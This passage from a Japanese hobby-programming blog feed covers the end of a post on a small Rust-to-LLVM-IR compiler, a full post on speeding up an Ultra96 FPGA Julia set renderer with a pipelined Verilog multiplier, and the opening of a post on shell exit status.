<span id="cb37-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb37-5" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>ptr <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span>  <span class="co">// 'C'</span></span>
<span id="cb37-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb37-6" aria-hidden="true" tabindex="-1"></a>putchar<span class="op">();</span></span>
<span id="cb37-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb37-7" aria-hidden="true" tabindex="-1"></a>ptr <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span>   <span class="co">// ptr[1] = '\n'</span></span>
<span id="cb37-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb37-8" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>ptr <span class="op">+=</span> <span class="dv">10</span><span class="op">;</span></span>
<span id="cb37-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb37-9" aria-hidden="true" tabindex="-1"></a>putchar<span class="op">();</span></span></code></pre></div>
<pre><code>$ cargo run -q &lt; ex1 &gt; ex1.ll

$ lli ex1.ll
ABC</code></pre>
<p>ループや <code>getchar()</code> も使ってみます。0 ~ 9 の値を1つ読み込み、その回数だけ ABC を表示するコードです。</p>
<div class="sourceCode" id="cb39"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb39-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="co">// ptr[0] ~ ptr[3]: 文字</span></span>
<span id="cb39-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-2" aria-hidden="true" tabindex="-1"></a><span class="co">// ptr[4]: ループカウンタ</span></span>
<span id="cb39-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-4" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>ptr <span class="op">+=</span> <span class="dv">65</span><span class="op">;</span>   <span class="co">// ptr[0] = 'A'</span></span>
<span id="cb39-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-5" aria-hidden="true" tabindex="-1"></a>ptr <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span>     <span class="co">// ptr[1] = 'B'</span></span>
<span id="cb39-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-6" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>ptr <span class="op">+=</span> <span class="dv">66</span><span class="op">;</span></span>
<span id="cb39-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-7" aria-hidden="true" tabindex="-1"></a>ptr <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span>     <span class="co">// ptr[2] = 'C'</span></span>
<span id="cb39-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-8" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>ptr <span class="op">+=</span> <span class="dv">67</span><span class="op">;</span></span>
<span id="cb39-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-9" aria-hidden="true" tabindex="-1"></a>ptr <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span>     <span class="co">// ptr[3] = '\n'</span></span>
<span id="cb39-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-10" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>ptr <span class="op">+=</span> <span class="dv">10</span><span class="op">;</span></span>
<span id="cb39-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-12" aria-hidden="true" tabindex="-1"></a>ptr <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb39-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-13" aria-hidden="true" tabindex="-1"></a>getchar<span class="op">();</span></span>
<span id="cb39-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-14" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>ptr <span class="op">-=</span> <span class="dv">48</span><span class="op">;</span>   <span class="co">// ptr[4] -= '0'</span></span>
<span id="cb39-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-16" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="op">*</span>ptr <span class="op">{</span></span>
<span id="cb39-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-17" aria-hidden="true" tabindex="-1"></a>    ptr <span class="op">-=</span> <span class="dv">4</span><span class="op">;</span></span>
<span id="cb39-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-19" aria-hidden="true" tabindex="-1"></a>    putchar<span class="op">();</span></span>
<span id="cb39-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-20" aria-hidden="true" tabindex="-1"></a>    ptr <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb39-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-21" aria-hidden="true" tabindex="-1"></a>    putchar<span class="op">();</span></span>
<span id="cb39-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-22" aria-hidden="true" tabindex="-1"></a>    ptr <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb39-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-23" aria-hidden="true" tabindex="-1"></a>    putchar<span class="op">();</span></span>
<span id="cb39-24"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-24" aria-hidden="true" tabindex="-1"></a>    ptr <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb39-25"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-25" aria-hidden="true" tabindex="-1"></a>    putchar<span class="op">();</span></span>
<span id="cb39-26"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-27"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-27" aria-hidden="true" tabindex="-1"></a>    ptr <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb39-28"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-28" aria-hidden="true" tabindex="-1"></a>    <span class="op">*</span>ptr <span class="op">-=</span> <span class="dv">1</span><span class="op">;</span>    <span class="co">// ptr[4] -= 1</span></span>
<span id="cb39-29"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb39-29" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<pre><code>$ cargo run -q &lt; ex2 &gt; ex2.ll 

$ echo -n 2 | lli ex2.ll
ABC
ABC

$ echo -n 3 | lli ex2.ll
ABC
ABC
ABC

$ echo -n 5 | lli ex2.ll
ABC
ABC
ABC
ABC
ABC

$ echo -n 7 | lli ex2.ll
ABC
ABC
ABC
ABC
ABC
ABC
ABC</code></pre>
<p>+。:.ﾟ٩(๑＞◡＜๑)۶:.｡+ﾟ</p>
<h2 id="まとめ">まとめ</h2>
<p>Brainf**k 処理系をきっかけにして生まれたコンパイラ chiya の実装を紹介しました。一部で流行りの自作 C コンパイラなどと比べるととても簡素なものだけれども、個人的には挫折したままになっていたコンパイラ実装をとりあえず達成でき、とてもスッキリしたので良かったなと思っています。また機会があれば、今度は流行りの C や <a href="https://github.com/rhysd/gocaml">Linda_pp さんの gocaml</a> みたいな関数型言語などより複雑な言語のコンパイラであったり、今回は省略した意味解析フェーズあたりに重みをおいて型・型推論システムの実装などもしてみたいなぁ…</p>
<p>chiya の実装は Rust でなにか書いてみるという目的もあったりしました。実際に書いてみた感想としては、<code>enum</code> で構文木がいい感じに表現できたり、<code>Option&lt;T&gt;</code> に <a href="https://doc.rust-lang.org/std/option/enum.Option.html#method.map"><code>map()</code></a>, <a href="https://doc.rust-lang.org/std/option/enum.Option.html#method.and_then"><code>and_then()</code></a>, <a href="https://doc.rust-lang.org/std/option/enum.Option.html#method.or_else"><code>or_else()</code></a> などのメソッドが<strong>ちゃんと</strong>生えていたりなど、C++ と Haskell を触った経験からくる「これ！！！！！！」なポイントがたくさんあってとても気持ちよかったです。実は Rust が話題になり始めた当初、TOML があまり好きじゃないとか <code>println!()</code> がマクロだとか<a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a>などのしょうもない理由で避けていたのですが、そんなことで流行に乗り遅れたことを本当に後悔するくらいに良い言語だなと思います。はやくガリガリ書けるようになりたいですね。</p>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>具体的な設計などの前に「こんな感じの処理ってプログラムできるかなー」とか「このライブラリ使えないかなー」とかを確認する実装をしたりします<a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>Rust 的には package ってワードのほうが良さそうかも <a href="https://doc.rust-lang.org/book/ch07-01-packages-and-crates.html" class="uri">https://doc.rust-lang.org/book/ch07-01-packages-and-crates.html</a><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p><a href="http://releases.llvm.org/9.0.0/docs/LangRef.html#abstract">公式リファレンス</a> を見た感じ “LLVM assembly language” や “LLVM language” が正式名称？っぽいけど、この記事では “LLVM IR” と書くことにします<a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4" role="doc-endnote"><p>構文木の上の要素 (今回だと <code>program</code>) から対応をとっていくので “Top-Down”、逆に下の要素 (今回だと <code>lhs</code> や <code>rhs</code>) から対応をとっていく “Bottom-Up” な構文解析もある<a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5" role="doc-endnote"><p>プログラミング言語でマクロといわれると C プリプロセッサのイメージがあるので、某所のコードや某 GUI フレームワークなどで散々苦しめられた経験から (╯•﹏•╰) ってなっちゃう<a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>Ultra96 で Julia set をぐりぐり動かせるやつをもう少し強くした</title>
    <link href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/index.html" />
    <id>https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/index.html</id>
    <published>2019-08-29T14:19:46Z</published>
    <updated>2019-08-29T14:19:46Z</updated>
    <summary type="html"><![CDATA[<p>以前 <a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/">Ultra96 で Julia set をぐりぐり動かせるやつ</a> (<a href="https://github.com/Tosainu/ultra96-fractal">GitHub</a>) の紹介をしました。この時点で当初作ろうとしていたものをだいたい実現できていたのですが、満足していない箇所もいくつかありました。</p>
<p>今回それらの点を改善して性能をあげたり、機能を追加したりしました。どんな感じに強くなったのかを紹介していきます。</p>
<blockquote class="twitter-tweet tw-align-center">
<p lang="ja" dir="ltr">
一度 HDL 書く開発してみたいなーってことで冬・春に HLS で書いたのを SystemVerilog で書き直してた。<a href="https://t.co/h7HXFqsaHa">https://t.co/h7HXFqsaHa</a> と比較して動作クロック3倍 (100➡300MHz)、描画速度2.67倍 (6➡16fps) に改善できて、色も変えれるようになった。 <a href="https://t.co/GoizfFcpYa">pic.twitter.com/GoizfFcpYa</a>
</p>
— ✧<em>。ヾ(｡˃﹏˂｡)ﾉﾞ。</em>✧ (@myon___) <a href="https://twitter.com/myon___/status/1163835624710795264?ref_src=twsrc%5Etfw">August 20, 2019</a>
</blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<!--more-->
<h2 id="描画パイプラインの改善">描画パイプラインの改善</h2>
<p>前回 Vivado HLS で実装した Julia set 描画回路は、僕の Vivado HLS 力の不足で「ぼくのかんがえたさいきょうの Julia set レンダリングパイプライン」にすることができていませんでした。</p>
<p>今までのパイプラインを簡単に図にするとこんな感じです。<span class="math inline">f_c(z)</span> を1度だけ評価する浅いパイプライン (6ステージと仮定) を持つ回路を、性能を稼ぐために複数並べている構造になっていました。</p>
<p><img src="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/pipeline1.svg" /></p>
<p>このため出力ポートが24bit ✕ 32並列で 768bit と、とても広くなっていました。<a href="https://github.com/Tosainu/ultra96-fractal/blob/v0.0.2/hls_ip/data_width_converter/data_width_converter.cc">雑に Vivado HLS で書いた回路</a>を挟んでデータを分割したりはしていましたがそれでも扱いづらかったですし、データがそんなに速くないのにこのデータ幅に対応させるためオーバースペックな周辺回路と接続する必要があり、性能面やリソース使用量の面でも微妙でした。</p>
<p>これを解決して「ぼくのかんがえたさいきょうの Julia set レンダリングパイプライン」にするために、回路の複製をやめ、<span class="math inline">f_c(z)</span> を何度か評価する深いパイプラインにしました。図にするとこんな感じです。</p>
<p><img src="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/pipeline2.svg" /></p>
<p>このようなパイプラインにすることで、前述したパイプラインと同程度の並列度を確保しつつ出力データ幅を1回路分に抑えることができます。実際には様々な要因によるリソースの増加<a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>の関係で HLS 版より並列度を32から29へ落とすことになり、クロックあたりの描画性能は15%ほど若干落ちてしまいましたが、無駄に大きな周辺回路と接続する必要などもなくとても扱いやすくなりました。</p>
<p>ちなみに、これを実現するため SystemVerilog での書き直しをしています。現状の実装が<a href="https://github.com/Tosainu/ultra96-fractal/blob/6a761b5facba503c95e770bc72bd3383dd1909f6/src/fractal_generator.sv">こんな感じ</a>です。1度 HDL をガリガリ書く開発をしてみたいなと思っていたのと、目的の回路がある程度イメージできているなら HLS コンパイラの気持ちを考えながら <code>pragma</code> を追加したり書き方を変えていくより直接書いていったほうが楽だろうという判断です。前回 Vivado HLS で試せるだけのことはやったのでこれ以上の対処が思いつかなかったからというのもあります。</p>
<h2 id="描画回路の動作クロック改善">描画回路の動作クロック改善</h2>
<p><a href="https://www.xilinx.com/support/documentation/user_guides/ug579-ultrascale-dsp.pdf">UltraScale Architecture DSP Slice User Guide</a> に書かれているように、DSP Slice を使った乗算回路はパイプライン化で性能向上と低消費電力化が可能で、そのような使い方を推奨しています。しかし前回実装した Julia set 描画回路は、Ultra96 で利用可能な DSP Slice のほぼ全てを使うほどの乗算回路を含んでいるにもかかわらず、その全てがパイプライン化されていない、組み合わせ回路として実装されていました。そのため、せいぜい 100MHz 程度で動作させるのが限界でした。</p>
<p><img src="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/dsp.svg" /></p>
<p>動作クロックの改善は性能に大きく関わります。そこで、前述したパイプラインの改善と並行して描画回路の動作クロック向上も行いました。</p>
<p>乗算回路のパイプライン化はそんなに難しくはありません。Vivado HLS なら <a href="https://www.xilinx.com/support/documentation/sw_manuals/xilinx2019_1/ug902-vivado-high-level-synthesis.pdf#page=172"><code>RESOURCE</code> ディレクティブで <code>latency</code> を指定したり <code>core</code> に <code>MulnS</code> を指定する</a> ことでできるようです。VHDL や Verilog など各種 HDL であれば、<a href="https://www.xilinx.com/support/answers/8657.html">AR# 8657</a> で紹介されているように、乗算処理の入力と出力に適切な数のレジスタを挿入することで、いい感じに合成してくれます。Verilog の例を引用するとこんな感じです。</p>
<blockquote>
<div class="sourceCode" id="cb1"><pre class="sourceCode verilog"><code class="sourceCode verilog"><span id="cb1-1"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">module</span> pipelined_multiplier <span class="op">(</span> a<span class="op">,</span> b<span class="op">,</span> clk<span class="op">,</span> pdt<span class="op">);</span></span>
<span id="cb1-2"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="co">/*</span></span>
<span id="cb1-3"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="co">* parameter 'size' is the width of multiplier/multiplicand;.Application Notes 10-5</span></span>
<span id="cb1-4"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="co">* parameter 'level' is the intended number of stages of the</span></span>
<span id="cb1-5"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="co">* pipelined multiplier;</span></span>
<span id="cb1-6"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="co">* which is typically the smallest integer greater than or equal</span></span>
<span id="cb1-7"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="co">* to base 2 logarithm of 'size'</span></span>
<span id="cb1-8"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="co">*/</span></span>
<span id="cb1-9"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="dt">parameter</span> size <span class="op">=</span> <span class="dv">16</span><span class="op">,</span> level <span class="op">=</span> <span class="dv">4</span><span class="op">;</span></span>
<span id="cb1-10"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="dt">input</span> <span class="op">[</span>size<span class="dv">-1</span> <span class="op">:</span> <span class="dv">0</span><span class="op">]</span> a<span class="op">;</span></span>
<span id="cb1-11"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="dt">input</span> <span class="op">[</span>size<span class="dv">-1</span> <span class="op">:</span> <span class="dv">0</span><span class="op">]</span> b<span class="op">;</span></span>
<span id="cb1-12"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="dt">input</span> clk<span class="op">;</span></span>
<span id="cb1-13"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="dt">output</span> <span class="op">[</span><span class="dv">2</span>*size<span class="dv">-1</span> <span class="op">:</span> <span class="dv">0</span><span class="op">]</span> pdt<span class="op">;</span></span>
<span id="cb1-14"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="dt">reg</span> <span class="op">[</span>size<span class="dv">-1</span> <span class="op">:</span> <span class="dv">0</span><span class="op">]</span> a_int<span class="op">,</span> b_int<span class="op">;</span></span>
<span id="cb1-15"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="dt">reg</span> <span class="op">[</span><span class="dv">2</span>*size<span class="dv">-1</span> <span class="op">:</span> <span class="dv">0</span><span class="op">]</span> pdt_int <span class="op">[</span>level<span class="dv">-1</span> <span class="op">:</span> <span class="dv">0</span><span class="op">];</span></span>
<span id="cb1-16"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="dt">integer</span> i<span class="op">;</span></span>
<span id="cb1-17"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-18"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="kw">assign</span> pdt <span class="op">=</span> pdt_int <span class="op">[</span>level<span class="dv">-1</span><span class="op">];</span></span>
<span id="cb1-19"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-20"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-20" aria-hidden="true" tabindex="-1"></a><span class="kw">always</span> <span class="op">@</span> <span class="op">(</span><span class="kw">posedge</span> clk<span class="op">)</span></span>
<span id="cb1-21"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-21" aria-hidden="true" tabindex="-1"></a><span class="kw">begin</span></span>
<span id="cb1-22"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-22" aria-hidden="true" tabindex="-1"></a>  <span class="co">// registering input of the multiplier</span></span>
<span id="cb1-23"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-23" aria-hidden="true" tabindex="-1"></a>  a_int <span class="op">&lt;=</span> a<span class="op">;</span></span>
<span id="cb1-24"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-24" aria-hidden="true" tabindex="-1"></a>  b_int <span class="op">&lt;=</span> b<span class="op">;</span></span>
<span id="cb1-25"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-25" aria-hidden="true" tabindex="-1"></a>  <span class="co">// 'level' levels of registers to be inferred at the output</span></span>
<span id="cb1-26"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-26" aria-hidden="true" tabindex="-1"></a>  <span class="co">// of the multiplier</span></span>
<span id="cb1-27"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-27" aria-hidden="true" tabindex="-1"></a>  pdt_int<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">&lt;=</span> a_int * b_int<span class="op">;</span></span>
<span id="cb1-28"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-28" aria-hidden="true" tabindex="-1"></a>  <span class="kw">for</span><span class="op">(</span>i <span class="op">=</span><span class="dv">1</span><span class="op">;</span>i <span class="op">&lt;</span>level<span class="op">;</span>i <span class="op">=</span>i <span class="op">+</span><span class="dv">1</span><span class="op">)</span></span>
<span id="cb1-29"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-29" aria-hidden="true" tabindex="-1"></a>    pdt_int <span class="op">[</span>i<span class="op">]</span> <span class="op">&lt;=</span> pdt_int <span class="op">[</span>i<span class="dv">-1</span><span class="op">];</span></span>
<span id="cb1-30"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-30" aria-hidden="true" tabindex="-1"></a><span class="kw">end</span> <span class="co">// always @ (posedge clk)</span></span>
<span id="cb1-31"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-31" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-32"><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#cb1-32" aria-hidden="true" tabindex="-1"></a><span class="kw">endmodule</span> <span class="co">// pipelined_multiplier</span></span></code></pre></div>
</blockquote>
<p>しかしパイプラインの段数を適切に設定してやらないと十分な性能を発揮してくれません。じゃあどの程度の値を指定すればいいのかの資料などを見つけることはできませんでしたが、Synthesis 時にレジスタが不足している とこんな感じの Info レベルのメッセージが出るので、その値を参考にすればよさそうでした。</p>
<pre><code>INFO: [Synth 8-5845] Not enough pipeline registers after wide multiplier. Recommended levels of pipeline registers is 4 [mul.sv:22]</code></pre>
<p>これらの取り組みにより、動作クロックは 300MHz まで上げることができ、描画性能は 16fps くらいまで出るようになりました。Vivado の Timing report を見た感じまだ余裕がありそうなので、機会があればもっと高いクロックでの動作を目指してみたいです。</p>
<h2 id="ステータス表示の実装">ステータス表示の実装</h2>
<p>前回紹介した時点では未実装で適当な値が表示されていたステータス表示部分をちゃんと実装しました。</p>
<p><img src="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/status.png" /></p>
<h2 id="表示アプリケーションを-libdrm-mesa-gbm-ベースに変更">表示アプリケーションを libdrm + Mesa GBM ベースに変更</h2>
<p>前回紹介した時点ではなにか特別な設定をしていたわけではないので、表示アプリを起動するために Weston Terminal から <code>fractal-explorer</code> コマンドを実行するなどの手間が必要でした。せっかくなら Ultra96 の電源を入れたら何もせず表示アプリが起動するようにしたいところです。</p>
<p>いろいろ調べてみたものの、Weston で任意のアプリケーションをいい感じに自動起動させる方法は無さそうでした。表示アプリを IME として扱う Hack や Weston module を作る方法なども検討しましたが、うーん…</p>
<p>しかし改めて考えてみると、実装した表示アプリの画面表示部分は OpenGL/EGL で書いていますし、操作するためのゲームパッドの入力も自前で処理しているので、「Wayland への依存ほとんどないのでは？」となります。ということで表示アプリを Weston 上で動かす Wayland client として実装するのをやめ、Linux をブートさせた後 libdrm や Mesa GBM を使って接続されているディスプレイに直接 OpenGL/EGL の context を作ってそこに表示するような実装へ変更しました。自動起動は <a href="https://layers.openembedded.org/layerindex/recipe/90245/">weston-init</a> パッケージの実装を参考に、<code>/etc/init.d/</code> 下に<a href="https://github.com/Tosainu/ultra96-fractal/blob/6a761b5facba503c95e770bc72bd3383dd1909f6/petalinux_project/project-spec/meta-user/recipes-apps/fractal-explorer/files/init">サービス</a>を作ることで実現しました。</p>
<p>libdrm や GBM の扱い方に関するドキュメント等はあまり豊富ではありません。しかし次のようなコメントが豊富な参考実装が結構あり、それがとても参考になりました。</p>
<ul>
<li><a href="https://github.com/dvdhrm/docs/tree/master/drm-howto">docs/drm-howto at master · dvdhrm/docs</a></li>
<li><a href="https://github.com/eyelash/tutorials/blob/master/drm-gbm.c">tutorials/drm-gbm.c at master · eyelash/tutorials</a></li>
<li><a href="https://gist.github.com/Miouyouyou/89e9fe56a2c59bce7d4a18a858f389ef">Miouyouyou/Linux_DRM_OpenGLES.c</a></li>
</ul>
<h2 id="まとめ">まとめ</h2>
<p>今回 HDL を使った実装も行ったことで、この「Ultra96 で Julia set をぐりぐり動かせるやつ」を通して近年の FPGA に関わる主要な開発方法をひと通り経験することになりました。新たに知ることが多くてとても楽しかったですし、良い経験だったなと思います。コンピュータアーキテクチャに再び大きな注目がされつつある<a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>時代でもありますし、このような開発が趣味レベルでももっと流行ると面白いのではないかなと思っています。</p>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>乗算処理のパイプライン化などにより DSP Slice の使用量が増加したため (32bit 乗算器1つあたり3 <span class="emoji" data-emoji="arrow_right">➡️</span> 4)、回路の簡略化のため実際には256回以上 <span class="math inline">f_c(z)</span> を評価しているため、Vivado HLS が行っていた過度のリソースシェアリングを行っていないため、など<a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p><a href="https://cacm.acm.org/magazines/2019/2/234352-a-new-golden-age-for-computer-architecture/fulltext" class="uri">https://cacm.acm.org/magazines/2019/2/234352-a-new-golden-age-for-computer-architecture/fulltext</a><a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>Exit status は無視しないようにしよう</title>
    <link href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/index.html" />
    <id>https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/index.html</id>
    <published>2019-08-08T04:09:56Z</published>
    <updated>2019-08-08T04:09:56Z</updated>
    <summary type="html"><![CDATA[<p><strong>「手順に従ってコマンドを順番に実行したけどなんか動かなかった」</strong></p>
<p>*nix 系のシステムを使った開発などで、何らかの目的を実現するために複数のシェルコマンドを実行する場面はよくあると思います。その操作が上手くいかなかったとき、こんな感じの質問をしてはいないでしょうか。また、このような場面で躓いているメンバーからこんな質問を受けたりすることはないでしょうか。</p>
